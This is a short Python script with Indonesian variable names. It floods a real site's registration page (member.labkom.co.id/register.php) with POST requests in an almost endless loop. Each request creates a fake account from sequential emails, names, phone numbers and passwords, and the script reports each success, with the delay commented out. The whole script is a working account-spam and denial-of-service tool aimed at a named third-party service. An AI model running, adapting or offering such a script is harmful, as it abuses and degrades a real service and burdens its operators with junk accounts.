import random
import time
import requests
import datetime

url = "https://member.labkom.co.id/register.php"

mulai = int(input("Mulai Dari : "))
waktu = str(datetime.datetime.now())
akhir = 1000000000000000000
kata = "Registrasi berhasil"
for i in range(mulai, akhir):
    try:
        obj = {
            'aktif' : 1,
            'username' : str('iloveyou'+str(i)+'@gmail.com'),
            'nama' : str('iloveyouFull'+str(i)+''),
            'wa' : str('12345678'+str(i)),
            'password' : str('1234567'+str(i)),
            'password2' : str('1234567'+str(i)),
            'btnLogin' : 'Register Now',
        }
        # hasil = requests.post(url, data=obj)
        # print("Respon " +hasil.text+' ke  '+str(i) + " Pada : " + waktu)

        hasil = requests.post(url, data = obj)
        try:
                hasil.text.index(kata)
        #       if(hasil.text.index(kata)):
                #print(hasil.text)
        except:
                print("Respon Gagal ke: " + str(i) + " Pada : " + waktu)
        #       print(kata+' ke  '+str(i))
        #       else:
        else:
                #print('Respon Berhasil')
                print("Respon " +kata+' ke  '+str(i) + " Pada : " + waktu)
        #time.sleep(2)
    except:
        print("gagal post ke: " + str(i) + " Pada : " + waktu)


        
